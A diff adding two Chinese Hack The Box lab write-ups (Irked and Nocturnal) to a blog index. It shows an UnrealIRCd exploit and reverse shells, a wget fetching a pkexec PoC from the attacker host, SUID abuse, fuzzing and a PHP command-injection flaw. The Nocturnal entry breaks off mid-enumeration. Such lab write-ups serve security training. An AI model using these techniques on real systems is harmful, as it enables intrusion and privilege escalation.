@@ -64,6 +64,495 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB-Irked</title>
+    <url>/Hackthebox/htb/htb-Irked/</url>
+    <content><![CDATA[<style>.gzvkmoukzxuw{zoom:50%;}</style><img src="/Hackthebox/htb/htb-Irked/5fb846e75cf0db0c4b27e2dc64a9bf82.png" class="gzvkmoukzxuw">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th align="left">OS</th>
+<th align="left">Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Linux</td>
+<td align="left">Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.117 <span class="token parameter variable">-T4</span> -p- --min-rate <span class="token number">1000</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span>        
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-04-19 <span class="token number">23</span>:18 CST
+Warning: <span class="token number">10.10</span>.10.117 giving up on port because retransmission cap hit <span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>.
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.117
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.10s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">65130</span> closed tcp ports <span class="token punctuation">(</span>conn-refused<span class="token punctuation">)</span>, <span class="token number">398</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
+PORT      STATE SERVICE VERSION
+<span class="token number">22</span>/tcp    <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">6</span>.7p1 Debian <span class="token number">5</span>+deb8u4 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey: 
+<span class="token operator">|</span>   <span class="token number">1024</span> 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad <span class="token punctuation">(</span>DSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>   <span class="token number">2048</span> <span class="token number">75</span>:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>   <span class="token number">256</span> c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  <span class="token number">256</span> 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
+<span class="token number">80</span>/tcp    <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.10 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
+<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">)</span>.
+<span class="token operator">|</span>_http-server-header: Apache/2.4.10 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
+<span class="token number">111</span>/tcp   <span class="token function">open</span>  rpcbind <span class="token number">2</span>-4 <span class="token punctuation">(</span>RPC <span class="token comment">#100000)</span>
+<span class="token operator">|</span> rpcinfo: 
+<span class="token operator">|</span>   program version    port/proto  <span class="token function">service</span>
+<span class="token operator">|</span>   <span class="token number">100000</span>  <span class="token number">2,3</span>,4        <span class="token number">111</span>/tcp   rpcbind
+<span class="token operator">|</span>   <span class="token number">100000</span>  <span class="token number">2,3</span>,4        <span class="token number">111</span>/udp   rpcbind
+<span class="token operator">|</span>   <span class="token number">100000</span>  <span class="token number">3,4</span>          <span class="token number">111</span>/tcp6  rpcbind
+<span class="token operator">|</span>   <span class="token number">100000</span>  <span class="token number">3,4</span>          <span class="token number">111</span>/udp6  rpcbind
+<span class="token operator">|</span>   <span class="token number">100024</span>  <span class="token number">1</span>          <span class="token number">40082</span>/tcp   status
+<span class="token operator">|</span>   <span class="token number">100024</span>  <span class="token number">1</span>          <span class="token number">57955</span>/udp6  status
+<span class="token operator">|</span>   <span class="token number">100024</span>  <span class="token number">1</span>          <span class="token number">59551</span>/udp   status
+<span class="token operator">|</span>_  <span class="token number">100024</span>  <span class="token number">1</span>          <span class="token number">59805</span>/tcp6  status
+<span class="token number">6697</span>/tcp  <span class="token function">open</span>  irc     UnrealIRCd
+<span class="token number">8067</span>/tcp  <span class="token function">open</span>  irc     UnrealIRCd
+<span class="token number">40082</span>/tcp <span class="token function">open</span>  status  <span class="token number">1</span> <span class="token punctuation">(</span>RPC <span class="token comment">#100024)</span>
+<span class="token number">65534</span>/tcp <span class="token function">open</span>  irc     UnrealIRCd
+Service Info: Host: irked.htb<span class="token punctuation">;</span> OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">130.19</span> seconds
+</code></pre>
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用 irc 客户端(hexchat和irssi都可以)访问6697 端口，可以看到连接信息中返回的“Unreal3.2.8.1”</p>
+<img src="/Hackthebox/htb/htb-Irked/image-20250419231152208.png" class="" title="irc">
+
+<p>通过检索，找到exp，修改脚本并执行</p>
+<img src="/Hackthebox/htb/htb-Irked/image-20250420005219142.png" class="" title="github">
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ python3 exploit.py <span class="token number">10.10</span>.10.117 <span class="token number">6697</span>  <span class="token parameter variable">-payload</span> python</code></pre>
+
+<p>成功接收到shell</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">9001</span>           
+Listening on <span class="token number">0.0</span>.0.0 <span class="token number">9001</span>
+Connection received on <span class="token number">10.10</span>.10.117 <span class="token number">37922</span>
+bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">601</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
+bash: no job control <span class="token keyword">in</span> this shell
+ircd@irked:~/Unreal3.2$ <span class="token function">id</span>
+<span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>ircd<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>ircd<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>ircd<span class="token punctuation">)</span></code></pre>
+
+<h3 id="路径一"><a href="#路径一" class="headerlink" title="路径一"></a>路径一</h3><p>查找 root 权限的二进制文件, 找到<code>/usr/bin/pkexec </code>和 <code>/usr/bin/viewuser</code></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">ircd@irked:~$ <span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> /4000 <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+<span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> /4000 <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
+/usr/bin/pkexec
+/usr/bin/X
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/viewuser
+/sbin/mount.nfs
+/bin/su
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span></code></pre>
+
+<h4 id="权限提升-方案一"><a href="#权限提升-方案一" class="headerlink" title="权限提升(方案一)"></a>权限提升(方案一)</h4><p>利用<code>/usr/bin/pkexec</code>: 查看目标机器环境中是否有gcc ，下载cve-2021-4034 exp 编译并执行</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">ircd@irked:~$ gcc <span class="token parameter variable">-v</span>
+Using built-in specs.
+<span class="token assign-left variable">COLLECT_GCC</span><span class="token operator">=</span>gcc
+<span class="token assign-left variable">COLLECT_LTO_WRAPPER</span><span class="token operator">=</span>/usr/lib/gcc/i586-linux-gnu/4.9/lto-wrapper
+Target: i586-linux-gnu
+Configured with: <span class="token punctuation">..</span>/src/configure <span class="token parameter variable">-v</span> --with-pkgversion<span class="token operator">=</span><span class="token string">'Debian 4.9.2-10+deb8u1'</span> --with-
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
+Thread model: posix
+gcc version <span class="token number">4.9</span>.2 <span class="token punctuation">(</span>Debian <span class="token number">4.9</span>.2-10+deb8u1<span class="token punctuation">)</span> 
+ircd@irked:~$ <span class="token builtin class-name">cd</span> /tmp
+ircd@irked:/tmp$ <span class="token function">wget</span> http://10.10.16.24/cve-2021-4034-poc.c 
+--2025-04-19 <span class="token number">11</span>:48:18--  http://10.10.16.24/cve-2021-4034-poc.c
+Connecting to <span class="token number">10.10</span>.16.24:80<span class="token punctuation">..</span>. connected.
+HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> OK
+Length: <span class="token number">1267</span> <span class="token punctuation">(</span><span class="token number">1</span>.2K<span class="token punctuation">)</span> <span class="token punctuation">[</span>text/x-csrc<span class="token punctuation">]</span>
+Saving to: ‘cve-2021-4034-poc.c’
+     0K <span class="token builtin class-name">.</span>                                                     <span class="token number">100</span>%  <span class="token assign-left variable">305M</span><span class="token operator">=</span>0s
+<span class="token number">2025</span>-04-19 <span class="token number">11</span>:48:20 <span class="token punctuation">(</span><span class="token number">305</span> MB/s<span class="token punctuation">)</span> - ‘cve-2021-4034-poc.c’ saved <span class="token punctuation">[</span><span class="token number">1267</span>/1267<span class="token punctuation">]</span>
+ircd@irked:/tmp$ <span class="token function">ls</span>
+cve-2021-4034-poc.c
+systemd-private-76f5017c0bbf4b1a9144ade090a6067e-colord.service-0MGbig
+systemd-private-76f5017c0bbf4b1a9144ade090a6067e-cups.service-auGCve
+systemd-private-76f5017c0bbf4b1a9144ade090a6067e-rtkit-daemon.service-cvkGJc
+vmware-root
+ircd@irked:/tmp$ gcc cve-2021-4034-poc.c <span class="token parameter variable">-o</span> cve-2021-4034-poc 
+gcc cve-2021-4034-poc.c <span class="token parameter variable">-o</span> cve-2021-4034-poc 
+
+ircd@irked:/tmp$ ./cve-2021-4034-poc                           
+./cve-2021-4034-poc
+<span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,1001<span class="token punctuation">(</span>ircd<span class="token punctuation">)</span></code></pre>
+
+<h4 id="权限提升-方案二"><a href="#权限提升-方案二" class="headerlink" title="权限提升(方案二)"></a>权限提升(方案二)</h4><p>利用<code>/usr/bin/viewuser</code>: 运行命令提示没有找到<code>/tmp/listusers</code> ，创建此文件并添加执行权限，重新运行命令即可提权成功</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">ircd@irked:~$ /usr/bin/viewuser 
+<span class="token punctuation">(</span>unknown<span class="token punctuation">)</span> :0           <span class="token number">2025</span>-04-19 <span class="token number">10</span>:00 <span class="token punctuation">(</span>:0<span class="token punctuation">)</span>
+sh: <span class="token number">1</span>: /tmp/listusers: not found
+This application is being devleoped to <span class="token builtin class-name">set</span> and <span class="token builtin class-name">test</span> user permissions
+It is still being actively developed
+ircd@irked:~$ <span class="token builtin class-name">echo</span> <span class="token string">'/bin/sh'</span> <span class="token operator">></span> /tmp/listusers 
+ircd@irked:~$ <span class="token function">chmod</span> +x /tmp/listusers
+ircd@irked:~$ /usr/bin/viewuser
+<span class="token punctuation">(</span>unknown<span class="token punctuation">)</span> :0           <span class="token number">2025</span>-04-19 <span class="token number">10</span>:00 <span class="token punctuation">(</span>:0<span class="token punctuation">)</span>
+djmardov pts/0        <span class="token number">2025</span>-04-19 <span class="token number">12</span>:05 <span class="token punctuation">(</span><span class="token number">10.10</span>.16.24<span class="token punctuation">)</span>
+<span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>ircd<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>ircd<span class="token punctuation">)</span></code></pre>
+
+<h3 id="路径二"><a href="#路径二" class="headerlink" title="路径二"></a>路径二</h3><p>信息收集：在<code>/home/djmardov/Document</code> 下可以找到 <code>.backup</code>文件</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">ircd@irked:/home/djmardov/Documents$ <span class="token function">ls</span> <span class="token parameter variable">-la</span>
+total <span class="token number">12</span>
+drwxr-xr-x  <span class="token number">2</span> djmardov djmardov <span class="token number">4096</span> Sep  <span class="token number">5</span>  <span class="token number">2022</span> <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">18</span> djmardov djmardov <span class="token number">4096</span> Sep  <span class="token number">5</span>  <span class="token number">2022</span> <span class="token punctuation">..</span>
+-rw-r--r--  <span class="token number">1</span> djmardov djmardov   <span class="token number">52</span> May <span class="token number">16</span>  <span class="token number">2018</span> .backup
+lrwxrwxrwx  <span class="token number">1</span> root     root       <span class="token number">23</span> Sep  <span class="token number">5</span>  <span class="token number">2022</span> user.txt -<span class="token operator">></span> /home/djmardov/user.txt
+ircd@irked:/home/djmardov/Documents$ <span class="token function">cat</span> .backup
+<span class="token function">cat</span> .backup
+Super elite steg backup pw
+UPupDOWNdownLRlrBAbaSSss</code></pre>
+
+<p>访问80端口可以看到，感觉可能是什么隐写术，保存图片并使用steghide提取信息，密码使用<code>.backup</code> 中获取的密码</p>
+<img src="/Hackthebox/htb/htb-Irked/image-20250420002023056.png" class="" title="web">
+
+<p>提取出pass.txt， 使用ssh登录成功</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ steghide extract <span class="token parameter variable">-sf</span> irked.jpg 
+Enter passphrase: 
+wrote extracted data to <span class="token string">"pass.txt"</span><span class="token builtin class-name">.</span>
+
+$ <span class="token function">cat</span> pass.txt  
+Kab6h+m+bbp2J:HG
+
+$  <span class="token function">ssh</span> djmardov@10.10.10.117
+The authenticity of <span class="token function">host</span> <span class="token string">'10.10.10.117 (10.10.10.117)'</span> can't be established.
+ED25519 key fingerprint is SHA256:Ej828KWlDpyEOvOxHAspautgmarzw646NS31tX3puFg.
+This key is not known by any other names.
+Are you sure you want to <span class="token builtin class-name">continue</span> connecting <span class="token punctuation">(</span>yes/no/<span class="token punctuation">[</span>fingerprint<span class="token punctuation">]</span><span class="token punctuation">)</span>? <span class="token function">yes</span>
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
+Last login: Tue May <span class="token number">15</span> 08:56:32 <span class="token number">2018</span> from <span class="token number">10.33</span>.3.3
+djmardov@irked:~$ <span class="token function">id</span> 
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>djmardov<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>djmardov<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>djmardov<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,25<span class="token punctuation">(</span>floppy<span class="token punctuation">)</span>,29<span class="token punctuation">(</span>audio<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,44<span class="token punctuation">(</span>video<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,108<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span>,110<span class="token punctuation">(</span>lpadmin<span class="token punctuation">)</span>,113<span class="token punctuation">(</span>scanner<span class="token punctuation">)</span>,117<span class="token punctuation">(</span>bluetooth<span class="token punctuation">)</span></code></pre>
+
+<h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p>同路径一</p>
+<table>
+<thead>
+<tr>
+<th align="left">Flag</th>
+<th align="left">Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Flag1</td>
+<td align="left">&#x2F;home&#x2F;djmardov&#x2F;user.txt</td>
+</tr>
+<tr>
+<td align="left">Flag2</td>
+<td align="left">&#x2F;root&#x2F;root.txt</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Hackthebox</category>
+      </categories>
+      <tags>
+        <tag>密码重用</tag>
+        <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB-Nocturnal</title>
+    <url>/Hackthebox/htb/htb-nocturnal/</url>
+    <content><![CDATA[<style>.prgdgiwrixui{zoom:50%;}</style><img src="/Hackthebox/htb/htb-nocturnal/f6a56cec6e9826b4ed124fb4155abc66.png" class="prgdgiwrixui">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th>OS</th>
+<th>Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Linux</td>
+<td>Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.11.64 <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span> 
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-04-18 <span class="token number">23</span>:42 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.11.64
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.11s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>conn-refused<span class="token punctuation">)</span>
+PORT   STATE SERVICE VERSION
+<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.2p1 Ubuntu 4ubuntu0.12 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey: 
+<span class="token operator">|</span>   <span class="token number">3072</span> <span class="token number">20</span>:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>   <span class="token number">256</span> 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  <span class="token number">256</span> d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
+<span class="token number">80</span>/tcp <span class="token function">open</span>  http    nginx <span class="token number">1.18</span>.0 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+<span class="token operator">|</span>_http-title: Did not follow redirect to http://nocturnal.htb/
+Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">15.09</span> seconds</code></pre>
+
+<p>在80端口存在 web应用，添加域名到本地解析</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.11.64 nocturnal.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>
+
+<h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><p>访问应用，可以自行注册用户</p>
+<img src="/Hackthebox/htb/htb-nocturnal/image-20250419153519866.png" class="" title="注册">
+
+<p>登录后有个上传功能，只支持pdf、doc、docx、xls、xlsx、odt，上传文件后查看文件url为<code>http://nocturnal.htb/view.php?username=admin123&amp;file=shell.php.pdf</code></p>
+<img src="/Hackthebox/htb/htb-nocturnal/image-20250419154125531.png" class="" title="文件上传">
+
+<h3 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h3><p>使用ffuf Fuzzing 用户名</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ ffuf <span class="token parameter variable">-w</span> /opt/secLists/Usernames/Names/names.txt:FUZZ <span class="token parameter variable">-u</span> <span class="token string">'http://nocturnal.htb/view.php?username=FUZZ&amp;file=shell.php.pdf'</span> <span class="token parameter variable">-H</span> <span class="token string">'Cookie: PHPSESSID=dldt7f2eqv1ia7j3dieiq69icu'</span>  <span class="token parameter variable">-fs</span> <span class="token number">2985</span> 
+
+
+        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
+       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
+       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
+        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
+         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
+          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           <span class="token builtin class-name">:</span> GET
+ :: URL              <span class="token builtin class-name">:</span> http://nocturnal.htb/view.php?username<span class="token operator">=</span>FUZZ<span class="token operator">&amp;</span><span class="token assign-left variable">file</span><span class="token operator">=</span>shell.php.pdf
+ :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /opt/secLists/Usernames/Names/names.txt
+ :: Header           <span class="token builtin class-name">:</span> Cookie: <span class="token assign-left variable">PHPSESSID</span><span class="token operator">=</span>dldt7f2eqv1ia7j3dieiq69icu
+ :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
+ :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
+ :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
+ :: Threads          <span class="token builtin class-name">:</span> <span class="token number">40</span>
+ :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
+ :: Filter           <span class="token builtin class-name">:</span> Response size: <span class="token number">2985</span>
+________________________________________________
+
+admin                   <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">3037</span>, Words: <span class="token number">1174</span>, Lines: <span class="token number">129</span>, Duration: 85ms<span class="token punctuation">]</span>
+amanda                  <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">3355</span>, Words: <span class="token number">1178</span>, Lines: <span class="token number">129</span>, Duration: 84ms<span class="token punctuation">]</span>
+tobias                  <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">3037</span>, Words: <span class="token number">1174</span>, Lines: <span class="token number">129</span>, Duration: 86ms<span class="token punctuation">]</span>
+:: Progress: <span class="token punctuation">[</span><span class="token number">10177</span>/10177<span class="token punctuation">]</span> :: Job <span class="token punctuation">[</span><span class="token number">1</span>/1<span class="token punctuation">]</span> :: <span class="token number">452</span> req/sec :: Duration: <span class="token punctuation">[</span><span class="token number">0</span>:00:22<span class="token punctuation">]</span> :: Errors: <span class="token number">0</span> ::
+</code></pre>
+
+<h3 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h3><p>访问fuzz出的用户名，在amanda账户下可以看到privacy.odt</p>
+<img src="/Hackthebox/htb/htb-nocturnal/image-20250419161728361.png" class="" title="越权">
+
+<p>下载并使用LibreOffice 打开可以找到密码</p>
+<img src="/Hackthebox/htb/htb-nocturnal/image-20250419161912039.png" class="" title="odt">
+
+<p>使用amanda 登录，可以跳转到admin pannel，有备份功能</p>
+<img src="/Hackthebox/htb/htb-nocturnal/image-20250419162240539.png" class="" title="管理页面">
+
+<p>下载备份文件</p>
+<img src="/Hackthebox/htb/htb-nocturnal/image-20250419162632127.png" class="" title="备份">
+
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>在admin.php中创建备份设置密码参数直接拼接进命令中，所以存在命令注入</p>
+<pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;...&gt;
+&lt;?php
+if (isset($_POST[&#39;backup&#39;]) &amp;&amp; !empty($_POST[&#39;password&#39;])) &#123;
+    $password &#x3D; cleanEntry($_POST[&#39;password&#39;]);
+    $backupFile &#x3D; &quot;backups&#x2F;backup_&quot; . date(&#39;Y-m-d&#39;) . &quot;.zip&quot;;
+
+    if ($password &#x3D;&#x3D;&#x3D; false) &#123;
+        echo &quot;&lt;div class&#x3D;&#39;error-message&#39;&gt;Error: Try another password.&lt;&#x2F;div&gt;&quot;;
+    &#125; else &#123;
+        $logFile &#x3D; &#39;&#x2F;tmp&#x2F;backup_&#39; . uniqid() . &#39;.log&#39;;
+       
+        $command &#x3D; &quot;zip -x &#39;.&#x2F;backups&#x2F;*&#39; -r -P &quot; . $password . &quot; &quot; . $backupFile . &quot; .  &gt; &quot; . $logFile . &quot; 2&gt;&amp;1 &amp;&quot;;
+        
+        $descriptor_spec &#x3D; [
+            0 &#x3D;&gt; [&quot;pipe&quot;, &quot;r&quot;], &#x2F;&#x2F; stdin
+            1 &#x3D;&gt; [&quot;file&quot;, $logFile, &quot;w&quot;], &#x2F;&#x2F; stdout
+            2 &#x3D;&gt; [&quot;file&quot;, $logFile, &quot;w&quot;], &#x2F;&#x2F; stderr
+        ];
+
+        $process &#x3D; proc_open($command, $descriptor_spec, $pipes);
+        if (is_resource($process)) &#123;
+            proc_close($process);
+        &#125;
+&lt;...&gt;</code></pre>
+
+<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>可以看到执行id命令成功</p>
+<img src="/Hackthebox/htb/htb-nocturnal/image-20250419170350593.png" class="" title="burp">
+
+<p>下载反弹shell的脚本</p>
+<img src="/Hackthebox/htb/htb-nocturnal/image-20250419211424366.png" class="" title="burp">
+
+<p>执行脚本</p>
+<img src="/Hackthebox/htb/htb-nocturnal/image-20250419211229272.png" class="" title="burp">
+
+<p>成功接收到shell</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">9001</span>                          
+Listening on <span class="token number">0.0</span>.0.0 <span class="token number">9001</span>
+Connection received on <span class="token number">10.10</span>.11.64 <span class="token number">40554</span>
+/bin/sh: <span class="token number">0</span>: can't access <span class="token function">tty</span><span class="token punctuation">;</span> job control turned off
+$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span></code></pre>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>在&#x2F;var&#x2F;www 目录下可以找到ispconfig文件和nocturnal_database.db并且存在密码hash，在home目录下存在用户tobias</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">pwd</span>
+/var/www/nocturnal.htb
